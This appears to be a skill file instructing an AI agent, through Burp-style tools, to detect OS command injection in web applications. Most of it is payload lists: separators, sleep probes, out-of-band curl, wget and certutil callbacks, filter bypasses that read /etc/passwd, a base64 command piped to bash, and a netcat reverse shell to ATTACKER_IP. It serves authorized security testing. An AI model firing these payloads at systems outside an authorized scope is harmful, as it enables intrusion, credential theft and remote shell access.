# Command Injection Detection Skill

## Objective
Identify OS command injection vulnerabilities where user input is passed to system shell commands.

## Instructions

### 1. Identify Potential Injection Points
Look for parameters that might interact with the OS:
- File operations (filename, path, upload)
- Network operations (hostname, IP, port, URL)
- System utilities (ping, nslookup, traceroute)
- PDF/image generation
- Archive operations (zip, tar)
- Email functionality (mail, sendmail)

Common parameter names:
```
cmd, exec, command, execute, ping, query, jump, code, reg,
do, func, arg, option, load, process, step, read, feature,
dir, path, folder, file, download, upload, host, ip, url,
to, from, template, log, daemon, email
```

### 2. Test Command Separators
Try different separators based on OS:

**Both Linux and Windows:**
```
; whoami
| whoami
|| whoami
& whoami
&& whoami
```

**Linux specific:**
```
`whoami`
$(whoami)
$((whoami))
{whoami,}
whoami|
```

**Windows specific:**
```
%0a whoami
\n whoami
```

### 3. Time-Based Detection
Use time delays to confirm blind command injection:

**Linux:**
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& sleep 5
&& sleep 5
|| sleep 5
```

**Windows:**
```
& ping -n 5 127.0.0.1
| ping -n 5 127.0.0.1
&& ping -n 5 127.0.0.1
|| ping -n 5 127.0.0.1
; ping -n 5 127.0.0.1
%0a ping -n 5 127.0.0.1
```

### 4. Out-of-Band Detection
Use `collaborator_generate` then test DNS/HTTP callbacks:

**Linux:**
```
; nslookup COLLABORATOR
| nslookup COLLABORATOR
`nslookup COLLABORATOR`
$(nslookup COLLABORATOR)
; curl http://COLLABORATOR
; wget http://COLLABORATOR
```

**Windows:**
```
& nslookup COLLABORATOR
| nslookup COLLABORATOR
& ping -n 1 COLLABORATOR
& certutil -urlcache -split -f http://COLLABORATOR/x x
```

### 5. Filter Bypass Techniques

**Space bypass:**
```
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
IFS=,;`cat<<<cat,/etc/passwd`
```

**Slash bypass:**
```
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0444444' '/-444444')etc$(echo . | tr '!-0444444' '/-444444')passwd
```

**Keyword bypass:**
```
w'h'o'am'i
w"h"o"am"i
who$@ami
wh\oami
/???/??t /???/p??s??  # /bin/cat /etc/passwd
```

**Encoding:**
```
echo d2hvYW1p | base64 -d | bash  # whoami
$(printf '\x77\x68\x6f\x61\x6d\x69')
```

**Wildcard bypass:**
```
/???/c?t /???/p?ss??
/???/n? -e /???/b??h ATTACKER_IP 4444
```

### 6. Polyglot Payloads
Test payloads that work across multiple contexts:
```
<!--#exec cmd="id"-->
{{7*7}}${7*7}<%= 7*7 %>${{7*7}}${{7*7}}
```

### 7. Confirm and Document
Use `http1_request` to verify with a clean PoC.

If confirmed, create finding with:
- Vulnerable parameter
- OS type (Linux/Windows)
- Working payload
- Evidence (command output, time delay, DNS callback)

## MCP Tools to Use
- `params_extract`: Enumerate all parameters
- `http1_request`: Send test requests
- `collaborator_generate` / `collaborator_poll`: OOB detection
- `repeater_tab_with_payload`: Manual testing
- `issue_create`: Report confirmed finding

## Keywords
rce, remote code execution, os injection, os command, injection de commande

## References
- PayloadsAllTheThings/Command Injection
- OWASP Command Injection
